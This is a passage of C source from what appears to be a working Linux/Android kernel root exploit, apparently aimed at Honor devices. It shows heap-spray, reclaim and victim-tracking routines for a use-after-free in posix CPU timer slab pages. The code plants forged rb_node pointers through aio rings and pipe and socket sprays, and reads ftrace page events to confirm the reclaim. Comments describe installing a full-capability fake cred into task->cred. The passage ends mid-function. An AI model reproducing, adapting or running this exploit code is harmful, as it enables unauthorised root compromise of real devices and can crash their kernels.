		int planted = 0;
		for (int cpu = 0; cpu < ncpu; cpu++) {
			for (int i = 0; i < g_cpu_n[cpu]; i++) {
				uint32_t *ring =
					(uint32_t *)(uintptr_t)g_cpu_ctx[cpu][i];
				uint64_t *node;
				if (ring[4] != UINT32_C(0xa10a10a1))
					continue;
				node = (uint64_t *)((char *)ring + node_off);
				node[0] = 0;
				node[1] = 0;
				node[2] = target;
				planted++;
			}
		}
		dprintf(STDOUT_FILENO,
			"[aio] plant-all rings=%d planted=%d off=%#x target=%#" PRIx64 "\n",
			rings, planted, node_off, target);
		if (planted) {
			quiet_reclaim_trace();
			return 0;
		}
	}
	dprintf(STDOUT_FILENO,
		"[aio] victim page missed rings=%d other_timer_pages=%d page_frees=%d page_allocs=%d victim_frees=%d\n",
		rings, other, free_hits, alloc_hits, victim_frees);
	quiet_reclaim_trace();
	return -1;
}

static unsigned long *g_hold;
static int g_nhold;
static pid_t g_holders[4];

static int hold_aio_children(void)
{
	int ready[2];
	if (pipe(ready))
		return -1;
	for (int i = 0; i < 4; i++) {
		pid_t pid = fork();
		if (pid < 0)
			return -1;
		if (pid == 0) {
			int n = 0;
			close(ready[0]);
			while (n < 20000) {
				unsigned long ctx = 0;
				if (syscall(SYS_io_setup, 1, &ctx))
					break;
				n++;
			}
			dprintf(STDOUT_FILENO, "[hold] child=%d rings=%d errno=%d\n",
				i, n, errno);
			if (write(ready[1], "x", 1) != 1)
				_exit(1);
			for (;;)
				pause();
		}
		g_holders[i] = pid;
	}
	close(ready[1]);
	for (int i = 0; i < 4; i++) {
		char bit;
		if (read(ready[0], &bit, 1) != 1)
			return -1;
	}
	close(ready[0]);
	return 0;
}
static int g_nhold;

static int drain_aio(void)
{
	g_hold = calloc(70000, sizeof(*g_hold));
	g_nhold = 0;
	if (!g_hold)
		return -1;
	while (g_nhold < 70000) {
		unsigned long ctx = 0;
		if (syscall(SYS_io_setup, 1, &ctx))
			break;
		g_hold[g_nhold++] = ctx;
	}
	dprintf(STDOUT_FILENO, "[aio-hold] rings=%d errno=%d\n", g_nhold, errno);
	return g_nhold > 1000 ? 0 : -1;
}

static void free_aio_hold(void)
{
	for (int i = 0; i < g_nhold; i++)
		syscall(SYS_io_destroy, g_hold[i]);
	g_nhold = 0;
	free(g_hold);
	g_hold = NULL;
}
static int g_catch[1024][2];
static int g_ncatch;

static int prepare_catch(void)
{
	g_ncatch = 0;
	for (int i = 0; i < 1024; i++) {
		if (pipe(g_catch[i]))
			break;
		if (fcntl(g_catch[i][1], F_SETFL, O_NONBLOCK)) {
			close(g_catch[i][0]);
			close(g_catch[i][1]);
			break;
		}
		g_ncatch++;
	}
	dprintf(STDOUT_FILENO, "[pipe] empty=%d\n", g_ncatch);
	return g_ncatch >= 128 ? 0 : -1;
}

static int reclaim_pipe(uint64_t victim, uint64_t target)
{
	uint64_t node_addr = victim + KITIMER_NODE;
	uint64_t node_pfn = object_pfn(node_addr);
	uint64_t victim_base = node_pfn & ~UINT64_C(1);
	unsigned node_off = (unsigned)(node_addr & 0xfff);
	unsigned char *page;
	int ncpu, wrote_pages = 0, free_hits = 0, order0 = 0, order1 = 0;
	if (node_off + 24 > 4096)
		return -1;
	page = mmap(NULL, 4096, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
	if (page == MAP_FAILED)
		return -1;
	memset(page, 0, 4096);
	{
		uint64_t *node = (uint64_t *)(page + node_off);
		node[0] = 0;
		node[1] = 0;
		node[2] = target;
	}
	build_watch();
	ncpu = cpu_count();
	dprintf(STDOUT_FILENO, "[pipe] cpus=%d node_pfn=%#" PRIx64 " off=%#x\n",
		ncpu, node_pfn, node_off);
	trigger_cmd("enable_event:kmem:mm_page_free\n");
	trigger_cmd("enable_event:kmem:mm_page_alloc\n");
	if (trace_off_on() || kick_rss())
		return -1;
	for (int i = 0; i < g_ncatch; i++) {
		int done = 0;
		if ((i % 32) == 0) {
			struct timespec pause = { .tv_nsec = 100000000 };
			pin_cpu((i / 32) % ncpu);
			if (i)
				nanosleep(&pause, NULL);
		}
		while (done < 4096) {
			ssize_t n = write(g_catch[i][1], page + done, (size_t)(4096 - done));
			if (n < 0)
				break;
			done += (int)n;
		}
		if (done == 4096)
			wrote_pages++;
	}
	write_file(TRACE "/tracing_on", "0\n");
	for (int cpu = 0; cpu < ncpu; cpu++) {
		char path[128], line[768];
		FILE *file;
		snprintf(path, sizeof(path), TRACE "/per_cpu/cpu%d/trace", cpu);
		file = fopen(path, "r");
		if (!file)
			continue;
		while (fgets(line, sizeof(line), file)) {
			uint64_t pfn = parse_pfn(line);
			if (pfn == UINT64_MAX || !watch_has(pfn))
				continue;
			if (strstr(line, "mm_page_free:"))
				free_hits++;
			if (!strstr(line, "mm_page_alloc:"))
				continue;
			if (pfn != node_pfn && pfn != victim_base)
				continue;
			if (strstr(line, "order=0"))
				order0++;
			if (strstr(line, "order=1"))
				order1++;
			dprintf(STDOUT_FILENO, "[pipe-alloc] %s", line);
		}
		fclose(file);
	}
	dprintf(STDOUT_FILENO,
		"[pipe] wrote=%d frees=%d victim_order0=%d victim_order1=%d\n",
		wrote_pages, free_hits, order0, order1);
	quiet_reclaim_trace();
	munmap(page, 4096);
	return order0 > 0 ? 0 : -1;
}

static int g_stream[4][2];
static int g_nstream;
static unsigned g_shift;
static uint64_t g_task;
static uint64_t g_cred_kva;
/* A fake-cred page was installed into task->cred: the parent must
 * hold its socket pages until reboot even when no victim zombie
 * remains.  Gates the zero-residual exit. */
static int g_fake_installed;
static int g_plant_cred;
static int g_wake[2] = { -1, -1 };
static int g_report[2] = { -1, -1 };
static pid_t g_cred_child_pid = -1;

static void close_stream(void)
{
	for (int i = 0; i < g_nstream; i++) {
		if (g_stream[i][0] >= 0)
			close(g_stream[i][0]);
		if (g_stream[i][1] >= 0)
			close(g_stream[i][1]);
		g_stream[i][0] = g_stream[i][1] = -1;
	}
	g_nstream = 0;
}

static int open_stream_socks(void)
{
	int big = 16 << 20;
	if (g_nstream)
		return 0;
	for (int i = 0; i < 4; i++) {
		g_stream[i][0] = g_stream[i][1] = -1;
		if (socketpair(AF_UNIX, SOCK_STREAM, 0, g_stream[i]))
			break;
		setsockopt(g_stream[i][0], SOL_SOCKET, SO_SNDBUF, &big, sizeof(big));
		setsockopt(g_stream[i][1], SOL_SOCKET, SO_RCVBUF, &big, sizeof(big));
		fcntl(g_stream[i][0], F_SETFL, O_NONBLOCK);
		g_nstream++;
	}
	return g_nstream ? 0 : -1;
}

static int env_int(const char *name, int def, int lo, int hi)
{
	const char *v = getenv(name);
	int n = v ? atoi(v) : def;
	if (n < lo)
		n = lo;
	if (n > hi)
		n = hi;
	return n;
}

/* ---------- armed-victim ledger -------------------------------------------
 *
 * Every child that dies with armed k_itimer nodes leaves a zombie whose reap
 * runs posix_cpu_timers_exit() -> timerqueue_del() over the freed slab page.
 * That is the fatal path seen in the dumplogs
 * (wait4 -> release_task -> timerqueue_del/rb_next -> panic).  A miss used to
 * leave the zombie parked without knowing who owned its slab page afterwards;
 * a later session teardown (init reaping us) then reaped it with arbitrary
 * page contents.
 *
 * The ledger records each armed victim: which 4 KiB halves of its 8 KiB slab
 * hold armed timer nodes, the latest page_free / first covering page_alloc
 * seen in the trace window, and a state:
 *
 *   OPEN      zombie parked, slab ownership not proven yet
 *   UNPROVEN  page covered by an unknown/foreign allocation, or never
 *             observed freed — the zombie must stay parked (holder = us)
 *   REPAIRED  zero-page repair reclaim proven, zombie reaped safely
 *   REAPED    success path: our planted page reaped inside one_uaf
 *
 * A freed-but-still-in-buddy slab is repairable: spraying all-zero pages at
 * the freed PFN until the trace proves OUR allocation covers it leaves
 * {0,0,0} rb_nodes, which timerqueue_del()/rb_next() unlink without touching
 * anything outside the page.  We may then waitpid() the zombie — no dangling
 * victim is carried into a successful session.
 */

#define V_OPEN     0
#define V_UNPROVEN 1
#define V_REPAIRED 2
#define V_REAPED   3
#define V_MAX      48

static struct vict {
	pid_t pid;
	uint64_t base;          /* pfn of the victim slab's 8 KiB base */
	unsigned need;          /* bit h = slab half h holds an armed node */
	unsigned freed;         /* bits: free event seen for that half */
	unsigned cover;         /* bits: page_alloc covering that half after its
	                           latest free */
	unsigned cover_self;    /* subset of cover whose allocator was us */
	double free_ts[2];
	int state;
} g_vic[V_MAX];
static int g_nvic;

static void victim_state(struct vict *v, int st, const char *reason)
{
	if (v->state == st)
		return;
	v->state = st;
	dprintf(STDOUT_FILENO,
		"[victim] pid=%d slab=%#llx state=%d %s\n", (int)v->pid,
		(unsigned long long)v->base, st, reason);
}

/* Trace event timestamp lives right before the event name: "… <ts>: event:".
 * The task comm itself can contain ':' (kworker/u16:3), so anchor on the
 * event name and parse the number before its last ':'. */
static double trace_line_ts(const char *line, const char *ev)
{
	const char *e = strstr(line, ev);
	const char *colon, *sp;
	double ts;
	char *end;
	if (!e)
		return -1.0;
	for (colon = e; colon > line && colon[-1] != ':'; colon--)
		;
	if (colon <= line)
		return -1.0;
	for (sp = colon - 1; sp > line && sp[-1] != ' '; sp--)
		;
	ts = strtod(sp, &end);
	if (end == sp || *end != ':')
		return -1.0;
	return ts;
}

/* Apply one trace line to a victim's free/cover ledger.  Shared by the
 * single-victim scan (reclaim misses) and the all-victim watcher scan. */
static void victim_apply_line(struct vict *v, const char *line)
{
	uint64_t head;
	double ts;
	int h;
	if (strstr(line, "mm_page_free:")) {
		for (h = 0; h < 2; h++) {
			if (!(v->need & (1u << h)))
				continue;
			if (!pfn_event_covers(line, v->base + h, NULL, NULL))
				continue;
			ts = trace_line_ts(line, "mm_page_free:");
			if (ts > v->free_ts[h]) {
				v->free_ts[h] = ts;
				v->freed |= 1u << h;
				if (v->cover & (1u << h))
					v->cover &= ~(1u << h);
				if (v->cover_self & (1u << h))
					v->cover_self &= ~(1u << h);
			}
		}
		return;
	}
	if (!strstr(line, "mm_page_alloc:"))
		return;
	ts = trace_line_ts(line, "mm_page_alloc:");
	if (ts < 0)
		return;
	for (h = 0; h < 2; h++) {
		if (!(v->need & (1u << h)))
			continue;
		if (!(v->freed & (1u << h)) || ts <= v->free_ts[h])
			continue;
		{
			uint64_t hd = 0;
			int ord = 0;
			uint64_t b = v->base & ~UINT64_C(1);
			if (!pfn_event_covers(line, v->base + h, &hd, &ord))
				continue;
			/* Same hard-hit rule as find_page_alloc: only a
			 * whole-slab allocation carries the plant. */
			if (ord < 1 || hd > b || ((b - hd) % 2) != 0 ||
			    hd + (UINT64_C(1) << ord) < b + 2)
				continue;
		}
		v->cover |= 1u << h;
		if (trace_task_is_self(line))
			v->cover_self |= 1u << h;
	}
}

/* Rescan the trace window for the victim slab halves.  A later free expires
 * an earlier cover (the page bounced back to the buddy); an alloc only counts
 * as cover when it is strictly after the latest free for that half.
 * Returns 1 when the scan completed the whole per-cpu buffers, 0 when the
 * byte budget truncated it (a missing event cannot be ruled out). */
static int victim_scan_budgeted(struct vict *v, size_t budget)
{
	int ncpu = cpu_count();
	int complete = 1;
	for (int cpu = 0; cpu < ncpu && budget; cpu++) {
		char path[128], line[768];
		FILE *file;
		snprintf(path, sizeof(path), TRACE "/per_cpu/cpu%d/trace", cpu);
		file = fopen(path, "r");
		if (!file)
			continue;
		while (fgets(line, sizeof(line), file)) {
			size_t used = strlen(line);
			if (used >= budget) {
				budget = 0;
				complete = 0;
				break;
			}
			budget -= used;
			victim_apply_line(v, line);
		}
		fclose(file);
	}
	return complete;
}

/* One forward pass over each per-cpu dump, applied to every unresolved
 * victim.  The watcher used to rescan the same trace once per victim with a
 * shared 4 MiB budget, so in practice it read only cpu0's oldest window; with
 * the watcher buffer at 1024 KiB the whole dump fits TRACE_SCAN_BUDGET and a
 * single pass is both correct and cheaper. */
static void victim_scan_all(void)
{
	int ncpu = cpu_count();
	for (int cpu = 0; cpu < ncpu; cpu++) {
		char path[128], line[768];
		size_t budget = TRACE_SCAN_BUDGET;
		FILE *file;
		snprintf(path, sizeof(path), TRACE "/per_cpu/cpu%d/trace", cpu);
		file = fopen(path, "r");
		if (!file)
			continue;
		while (fgets(line, sizeof(line), file)) {
			size_t used = strlen(line);
			if (used >= budget)
				break;
			budget -= used;
			for (int i = 0; i < g_nvic; i++) {
				struct vict *v = &g_vic[i];
				if (v->state != V_OPEN && v->state != V_UNPROVEN)
					continue;
				victim_apply_line(v, line);
			}
		}
		fclose(file);
	}
}

static int victim_scan(struct vict *v)
{
	return victim_scan_budgeted(v, TRACE_SCAN_BUDGET);
}

static struct vict *victim_reg(pid_t child, uint64_t victim_obj)
{
	struct vict *v;
	/* Refuse to arm if the runner cannot persist ARMED atomically.  A missing
	 * state must never make an armed exit look like a safe pre-arm exit. */
	if (native_state("ARMED") != 0) {
		dprintf(STDOUT_FILENO,
			"[state] ARMED persist failed; refusing to arm errno=%d\n", errno);
		return NULL;
	}
	if (g_nvic >= V_MAX) {
		dprintf(STDOUT_FILENO,
			"[victim] ledger full, pid=%d untracked (parked)\n",
			(int)child);
		return NULL;
	}
	v = &g_vic[g_nvic++];
	memset(v, 0, sizeof(*v));
	v->pid = child;
	v->base = object_pfn(victim_obj) & ~UINT64_C(1);
	v->free_ts[0] = v->free_ts[1] = -1.0;
	if (g_plant_cred && g_tiles_on) {
		/* Every armed node, planted or TILE_NONE, is reaped: the TILE_NONE
		 * node only stays a safe zeroed root while its half is ours too. */
		for (int b = 0; b < 3; b++)
			v->need |= 1u << (g_tile_off[b] >> 12);
		v->need |= 1u << (((victim_obj + KITIMER_NODE) & 0x1fff) >> 12);
	} else {
		v->need = 1u << (((victim_obj + KITIMER_NODE) & 0x1fff) >> 12);
	}
	if (!v->need)
		v->need = 3;
	dprintf(STDOUT_FILENO,
		"[victim] armed pid=%d slab=%#llx need=%u\n", (int)child,
		(unsigned long long)v->base, v->need);
	return v;
}

static void victim_summary(void);
static void unproven_marker_sync(void);

static void victim_reap(struct vict *v)
{
	int st = 0;
	pid_t r;
	errno = 0;
	do {
		r = waitpid(v->pid, &st, 0);
	} while (r < 0 && errno == EINTR);
	if (r != v->pid) {
		dprintf(STDOUT_FILENO, "[victim] waitpid pid=%d errno=%d\n",
			(int)v->pid, errno);
		/* A failed wait is not proof of reap.  Keep the victim visible to
		 * unproven_marker_sync() and the zygote guard. */
		victim_state(v, V_UNPROVEN, "reap_waitpid_failed");
		return;
	}
	dprintf(STDOUT_FILENO,
		"[victim] reaped pid=%d status=%d\n", (int)v->pid, st);
	victim_state(v, V_REPAIRED, "reaped_after_proven");
}

/* Spray zero pages at the freed slab until our own allocation is proven to
 * cover every needed half; then the zombie is safe to reap.  Returns 0 when
 * the victim is fully resolved (reaped or proven foreign/unresolvable). */
static int victim_repair(struct vict *v)
{
	static const unsigned char zero[8192];
	struct timespec pause = { .tv_nsec = 50000000 };
	int rounds = env_int("PC98260_REPAIR_ROUNDS", 8, 1, 64);
	int ncpu = cpu_count();
	if (open_stream_socks())
		return 0;
	if (!g_nstream)
		return 0;
	for (int r = 0; r < rounds; r++) {
		for (int i = 0, sock = 0; i < 80; i++) {
			pin_cpu(i % ncpu);
			if (write(g_stream[sock][0], zero, sizeof(zero)) ==
			    (ssize_t)sizeof(zero))
				continue;
			if (++sock >= g_nstream)
				break;
		}
		victim_scan(v);
		if ((v->cover & v->need) && (v->cover & ~v->cover_self)) {
			victim_state(v, V_UNPROVEN, "foreign_cover");
			return 0;
		}
		if ((v->cover & v->need) == v->need &&
		    (v->cover_self & v->need) == v->need) {
			victim_reap(v);
			return 0;
		}
		if (past_deadline())
			break;
		nanosleep(&pause, NULL);
	}
	return 1;
}

/* Classify a post-arm reclaim miss.  The buffer still holds the reclaim
 * window's page events at this point (it is scanned before
 * quiet_reclaim_trace() shrinks it). */
static void victim_eval_miss(struct vict *v)
{
	if (!v || v->state != V_OPEN)
		return;
	victim_scan(v);
	if ((v->cover & v->need) && (v->cover & ~v->cover_self)) {
		victim_state(v, V_UNPROVEN, "foreign_cover");
		return;
	}
	if ((v->cover & v->need) == v->need &&
	    (v->cover_self & v->need) == v->need) {
		victim_reap(v);
		return;
	}
	if ((v->freed & v->need) == v->need)
		victim_repair(v);
	/* else: no complete free observed; stays OPEN, swept later */
}

/* Before reporting success (or giving up) resolve every OPEN victim: give a
 * still-unfreed slab a last bounded wait, repair freed-in-buddy slabs, and
 * leave only explicitly UNPROVEN zombies parked under our own watch. */
static void victim_sweep(void)
{
	int opened = 0;
	for (int i = 0; i < g_nvic; i++)
		if (g_vic[i].state == V_OPEN)
			opened = 1;
	if (!opened)
		return;
	write_file(TRACE "/buffer_size_kb", "8192\n");
	trigger_cmd("enable_event:kmem:mm_page_alloc\n");
	trigger_cmd("enable_event:kmem:mm_page_free\n");
	write_file(TRACE "/tracing_on", "1\n");
	for (int r = 0; r < 12; r++) {
		struct timespec pause = { .tv_sec = 1 };
		int left = 0;
		for (int i = 0; i < g_nvic; i++) {
			struct vict *v = &g_vic[i];
			if (v->state != V_OPEN)
				continue;
			victim_scan(v);
			if ((v->cover & v->need) &&
			    (v->cover & ~v->cover_self)) {
				victim_state(v, V_UNPROVEN, "foreign_cover");
				continue;
			}
			if ((v->cover & v->need) == v->need &&
			    (v->cover_self & v->need) == v->need) {
				victim_reap(v);
				continue;
			}
			if ((v->freed & v->need) == v->need)
				victim_repair(v);
			if (v->state == V_OPEN)
				left++;
		}
		if (!left || past_deadline())
			break;
		nanosleep(&pause, NULL);
	}
	quiet_reclaim_trace();
	/* Never reap a zombie whose reclaim was not positively proven by our
	 * own zero-page allocation on every needed half.  "No free observed" is
	 * not proof: one half can be freed and reallocated by a foreign owner
	 * while the trace ring truncates the evidence, and reaping then walks a
	 * corrupted rb tree.  With 3+ missed victims this exact branch panicked
	 * repeatedly (rb_next/timerqueue_del).  Unproven victims stay under the
	 * parked parent and the watcher repairs them only after a self-cover. */
	for (int i = 0; i < g_nvic; i++) {
		struct vict *v = &g_vic[i];
		if (v->state != V_OPEN)
			continue;
		victim_state(v, V_UNPROVEN, "unproven_reap_refused");
	}
	unproven_marker_sync();
}

/* Persistent boot-scoped marker for the hotfix/soft-reboot guard.  The app-side
 * check on the run log is lost when the app restarts; this file is the
 * device-side source of truth.  While any armed victim is OPEN or UNPROVEN the
 * marker exists with "<boot_id> <count>"; once every victim is reaped the
 * marker is removed.  lsposed-hotfix.sh must refuse the zygote restart while
 * the marker matches the current boot. */
#define UNPROVEN_MARKER "/data/local/tmp/.magicroot-unproven"

/* A marker written in an earlier boot describes pages that no longer exist.
 * Removing it at startup keeps the soft-reboot guard and the hotfix from
 * reporting phantom armed victims for the rest of this boot. */
static void unproven_marker_prune_stale(void)
{
	char cur[64] = { 0 }, line[128] = { 0 }, mark_boot[64] = { 0 };
	int fd, n;
	fd = open("/proc/sys/kernel/random/boot_id", O_RDONLY | O_CLOEXEC);
	if (fd < 0)
		return;
	n = (int)read(fd, cur, sizeof(cur) - 1);
	close(fd);
	if (n <= 0)
		return;
	if (cur[n - 1] == '\n')
		cur[n - 1] = 0;
	fd = open(UNPROVEN_MARKER, O_RDONLY | O_CLOEXEC);
	if (fd < 0)
		return;
	n = (int)read(fd, line, sizeof(line) - 1);
	close(fd);
	if (n <= 0)
		return;
	if (sscanf(line, "%63s", mark_boot) != 1) {
		unlink(UNPROVEN_MARKER);
		return;
	}
	if (strcmp(mark_boot, cur) != 0) {
		if (unlink(UNPROVEN_MARKER) == 0)
			dprintf(STDOUT_FILENO,
				"[victim] stale unproven marker removed boot=%s\n",
				mark_boot);
	}
}

static void unproven_marker_sync(void)
{
	int open_cnt = 0;
	for (int i = 0; i < g_nvic; i++)
		if (g_vic[i].state == V_OPEN || g_vic[i].state == V_UNPROVEN)
			open_cnt++;
	if (!open_cnt) {
		unlink(UNPROVEN_MARKER);
		return;
	}
	char boot[64] = { 0 };
	int bfd = open("/proc/sys/kernel/random/boot_id", O_RDONLY | O_CLOEXEC);
	if (bfd >= 0) {
		ssize_t n = read(bfd, boot, sizeof(boot) - 1);
		close(bfd);
		if (n > 0 && boot[n - 1] == '\n')
			boot[n - 1] = 0;
	}
	char text[96];
	int len = snprintf(text, sizeof(text), "%s %d\n", boot, open_cnt);
	int fd = open(UNPROVEN_MARKER, O_WRONLY | O_CREAT | O_TRUNC | O_CLOEXEC,
		      0666);
	if (fd >= 0) {
		ssize_t written = write(fd, text, (size_t)len);
		if (written == (ssize_t)len && fsync(fd) != 0)
			dprintf(STDOUT_FILENO,
				"[victim] marker fsync failed errno=%d\n", errno);
		else if (written != (ssize_t)len)
			dprintf(STDOUT_FILENO,
				"[victim] marker short write errno=%d\n", errno);
		close(fd);
		/* Persist the directory entry as well as the file contents.  A soft
		 * reboot must never see a zero-filled, freshly created marker. */
		int dfd = open("/data/local/tmp", O_RDONLY | O_DIRECTORY | O_CLOEXEC);
		if (dfd >= 0) {
			(void)fsync(dfd);
			close(dfd);
		}
	}
}

/* The parked parent keeps watching: a foreign-covered page can cycle back
 * through the buddy, after which a zero-page reclaim proves safe content
 * and the zombie can finally be reaped.  Runs forever; between rounds it
 * sleeps so the page-holder does not burn CPU.  Caller: park sites. */
static void victim_watch_forever(void)
{
	/* 1024 KiB per cpu keeps the whole text dump (~3.8 MiB) inside the
	 * scanner's 4 MiB budget; 8192 KiB made every scan read only the oldest
	 * part of a ~30 MiB dump. */
	write_file(TRACE "/buffer_size_kb", "1024\n");
	trigger_cmd("enable_event:kmem:mm_page_alloc\n");
	trigger_cmd("enable_event:kmem:mm_page_free\n");
	for (;;) {
		int open = 0;
		write_file(TRACE "/tracing_on", "1\n");
		victim_scan_all();
		for (int i = 0; i < g_nvic; i++) {
			struct vict *v = &g_vic[i];
			if (v->state != V_OPEN && v->state != V_UNPROVEN)
				continue;
			if ((v->cover & v->need) == v->need &&
			    (v->cover_self & v->need) == v->need) {
				victim_reap(v);
				continue;
			}
			if ((v->freed & v->need) == v->need &&
			    !(v->cover & v->need))
				victim_repair(v);
			if (v->state == V_OPEN || v->state == V_UNPROVEN)
				open++;
		}
		unproven_marker_sync();
		{
			struct timespec pause = { .tv_sec = 5 };
			nanosleep(&pause, NULL);
		}
		if (!open) {
			victim_summary();
			quiet_reclaim_trace();
			/* keep a cheap periodic rescan in case a new stale trace
			 * appears (buffer wraps); nothing to reap but stay alive */
			{
				struct timespec idle = { .tv_sec = 30 };
				for (;;) {
					nanosleep(&idle, NULL);
				}
			}
		}
	}
}

static void victim_summary(void)
{
	int reaped = 0, repaired = 0, unproven = 0;
	for (int i = 0; i < g_nvic; i++) {
		if (g_vic[i].state == V_REAPED)
			reaped++;
		else if (g_vic[i].state == V_REPAIRED)
			repaired++;
		else
			unproven++;
	}
	dprintf(STDOUT_FILENO,
		"[victim] summary total=%d reaped=%d repaired=%d unproven=%d\n",
		g_nvic, reaped, repaired, unproven);
}


/* Shark-style resolved-only teardown: a real-cred parent with no open or
 * unproven victims holds no UAF page anymore, so it may exit normally.  Any
 * unresolved armed victim still selects the permanent watcher.  The fake-cred
 * branch deliberately does not use this: its fake-cred pages stay held. */
static void victim_finish_or_watch(void)
{
	int open = 0;
	victim_summary();
	for (int i = 0; i < g_nvic; i++)
		if (g_vic[i].state == V_OPEN || g_vic[i].state == V_UNPROVEN)
			open++;
	/* Resolved teardown must clear the boot-scoped guard as well.  Without
	 * this the marker stayed behind, and a later boot reported phantom
	 * unproven victims (2026-11-14 00:15: native unproven=0, wrapper 1). */
	unproven_marker_sync();
	if (open) {
		dprintf(STDOUT_FILENO,
			"[lifetime] unresolved victims=%d; keeping watcher\n", open);
		victim_watch_forever();
	}
	quiet_reclaim_trace();
	dprintf(STDOUT_FILENO,
		"[lifetime] all victims resolved; parent exit allowed\n");
}

/* Fake-cred success: the installed full-cap cred lives in a reclaimed page
 * owned by this parent, and any unresolved victims are held for the same
 * reason.  Trace scanning cannot make those pages releasable -- it only
 * re-read a stale window forever (measured ~6 MiB/s and ~18% of one core
 * after handoff).  Keep the pages, record the marker once, then sleep without
 * touching tracefs again. */
static void victim_park_hold_pages(void)
{
	int open = 0;
	for (int i = 0; i < g_nvic; i++)
		if (g_vic[i].state == V_OPEN || g_vic[i].state == V_UNPROVEN)
			open++;
	victim_summary();
	unproven_marker_sync();
	dprintf(STDOUT_FILENO,
		"[lifetime] fake-cred handed off; holding pages without trace scans (unproven=%d)\n",
		open);
	quiet_reclaim_trace();
	for (;;) {
		struct timespec idle = { .tv_sec = 600 };
		nanosleep(&idle, NULL);
	}
}

/* Create/free timers on every present CPU to force SLUB to return the
 * victim's now-empty order-1 slab. This is the 6.12/Honor replacement for
 * the 6.18 free_slab trace assumption: the empty slab can stay on a CPU
 * partial list indefinitely, so a plain free_slab wait never observes it. */
static int timer_churn(uint64_t base, uint64_t want_half,
		       struct page_free_info *out)
{
	int rounds = env_int("PC98260_CHURN_ROUNDS", 16, 1, 64);
	int per_cpu = env_int("PC98260_CHURN_PER_CPU", 128, 1, 512);
	int ncpu = cpu_count();
	timer_t ids[512];
	struct timespec pause = { .tv_nsec = 20000000 };
	int total = 0;

	memset(out, 0, sizeof(*out));
	for (int r = 0; r < rounds; r++) {
		for (int cpu = 0; cpu < ncpu; cpu++) {
			int made = 0;
			pin_cpu(cpu);
			for (int i = 0; i < per_cpu; i++) {
				struct sigevent ev;
				memset(&ev, 0, sizeof(ev));
				ev.sigev_notify = SIGEV_NONE;
				if (timer_create(CLOCK_THREAD_CPUTIME_ID, &ev, &ids[made]))
					break;
				made++;
			}
			for (int i = 0; i < made; i++)
				timer_delete(ids[i]);
			total += made;
			nanosleep(&pause, NULL);
		}
		/* The free event is global, so one scan after the whole round sees
		 * every cpu.  Scanning after each cpu repeated the same multi-MiB
		 * trace-tail read up to 8x per round; with the text fallback that
		 * was the dominant cost of a miss (64 scans on attempt 2). */
		if (find_page_free(base, want_half, out)) {
			dprintf(STDOUT_FILENO,
				"[churn] hit round=%d cpu=%d pfn=%#" PRIx64 " order=%d total=%d\n",
				r, out->cpu, out->pfn, out->order, total);
			pin_cpu(0);
			return 1;
		}
		if ((r % 4) == 3)
			dprintf(STDOUT_FILENO, "[churn] round=%d total=%d\n", r, total);
	}
	pin_cpu(0);
	return 0;
}

/* Reclaim only the 4K half that contains the stale node. pat is the 8 KiB
 * fake page; slice points at the half that was actually released. */

/* Persistent spray workers.  They are created before the first exec gate is
 * opened and then reused, so pthread stack faults never land in the reclaim
 * window.  Each worker owns one socketpair; the main thread remains the only
 * trace scanner.  Set PC98260_FAST_SPRAY=0 for the original sequential loop. */
static pthread_t g_fast_threads[FAST_SPRAY_THREADS];
static int g_fast_started;
static _Atomic int g_fast_active;
static _Atomic int g_fast_inflight;
static _Atomic long g_fast_writes;
static const unsigned char *g_fast_pat;
static int g_fast_cpu;

static void *fast_spray_worker(void *arg)
{
	int idx = (int)(intptr_t)arg;
	int was_active = 0;
	struct timespec idle = { .tv_nsec = 1000000 };
	atomic_store_explicit(&g_fast_tids[idx], (int)syscall(SYS_gettid),
			      memory_order_release);
	for (;;) {
		if (!atomic_load_explicit(&g_fast_active, memory_order_acquire)) {
			was_active = 0;
			nanosleep(&idle, NULL);
			continue;
		}
		if (!was_active) {
			pin_cpu(g_fast_cpu >= 0 ? g_fast_cpu : idx);
			was_active = 1;
		}
		atomic_fetch_add_explicit(&g_fast_inflight, 1, memory_order_acq_rel);
		ssize_t n = write(g_stream[idx][0], g_fast_pat, 8192);
		atomic_fetch_add_explicit(&g_fast_inflight, -1, memory_order_acq_rel);
		if (n == 8192)
			atomic_fetch_add_explicit(&g_fast_writes, 1, memory_order_relaxed);
		else {
			struct timespec full = { .tv_nsec = 200000 };
			nanosleep(&full, NULL);
		}
	}
}

static void fast_pool_prepare(void)
{
	if (g_fast_started)
		return;
	g_fast_started = -1;
	for (int i = 0; i < FAST_SPRAY_THREADS; i++)
		atomic_store_explicit(&g_fast_tids[i], -1, memory_order_relaxed);
	for (int i = 0; i < FAST_SPRAY_THREADS; i++)
		if (pthread_create(&g_fast_threads[i], NULL, fast_spray_worker,
				   (void *)(intptr_t)i))
			return;
	g_fast_started = 1;
}

static int find_page_alloc_page(uint64_t pfn, int prefer_cpu)
{
	if (g_raw_active)
		return raw_find_alloc_page(pfn, prefer_cpu);
	int ncpu = cpu_count();
	int seq[16], nseq = 0;
	g_alloc_cover = 0;
	if (prefer_cpu >= 0 && prefer_cpu < ncpu)
		seq[nseq++] = prefer_cpu;
	for (int cpu = 0; cpu < ncpu && nseq < 16; cpu++)
		if (cpu != prefer_cpu)
			seq[nseq++] = cpu;
	for (int s = 0; s < nseq; s++) {
		int cpu = seq[s];
		char path[128];
		struct trace_tail *t;
		size_t budget = TRACE_SCAN_BUDGET;
		snprintf(path, sizeof(path), TRACE "/per_cpu/cpu%d/trace", cpu);
		t = trace_tail_open(path);
		if (!t)
			continue;
		while (budget && trace_tail_next(t)) {
			size_t used = strlen(t->line) + 1;
			uint64_t head = 0;
			int order = 0;
			if (used >= budget) {
				budget = 0;
				break;
			}
			budget -= used;
			if (!strstr(t->line, "mm_page_alloc:"))
				continue;
			if (!pfn_event_covers(t->line, pfn, &head, &order))
				continue;
			if (order != 0 || head != pfn)
				continue;
			g_alloc_cover++;
			/* Any allocation covering this 4 KiB page counts: an
			 * order-0 datagram page (head == pfn) or an order>=1
			 * slab that covers it.  The writer may be the main
			 * thread when raw trace is unavailable. */
			if (!trace_task_is_self(t->line) &&
			    !trace_task_is_spray(t->line))
				continue;
			trace_tail_close(t);
			return 1;
		}
		trace_tail_close(t);
	}
	return 0;
}

static int reclaim_stream_half(const unsigned char *slice, size_t len,
			       uint64_t free_pfn, int free_cpu)
{
	struct timespec pause = { .tv_nsec = 50000000 };
	int wrote = 0;

	if (free_cpu >= 0)
		(void)pin_cpu(free_cpu);
	dprintf(STDOUT_FILENO,
